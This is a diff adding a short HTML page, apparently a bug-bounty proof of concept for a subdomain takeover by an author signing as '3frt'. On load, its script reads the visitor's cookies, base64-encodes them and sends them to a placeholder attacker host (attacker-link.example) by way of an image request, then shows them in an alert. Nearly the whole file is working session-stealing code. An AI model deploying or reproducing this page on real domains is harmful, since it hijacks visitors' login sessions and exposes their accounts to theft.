@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>subdomain takeover poc by 3frt</title>
+</head>
+<body>
+    <h1>subdomain takeover by 0_0 3frt</h1>
+    <h2>for poc your session now is sent to webhook server agent...</h2>
+    
+    <script>
+        // 1. Get the cookies
+        var cookies = document.cookie;
+
+        // 2. Base64 encode the cookies (to handle special characters)
+        var encodedCookies = btoa(cookies);
+
+        // 3. Your Webhook.site URL (REPLACE THIS WITH YOUR ACTUAL URL)
+        var exfilUrl = "https://attacker-link.example";
+
+        var stealer = new Image();
+        stealer.src = exfilUrl + "?data=" + encodedCookies;
+    </script>
+    <script>
+        alert(document.cookie);
+    </script>
+</body>
+</html>
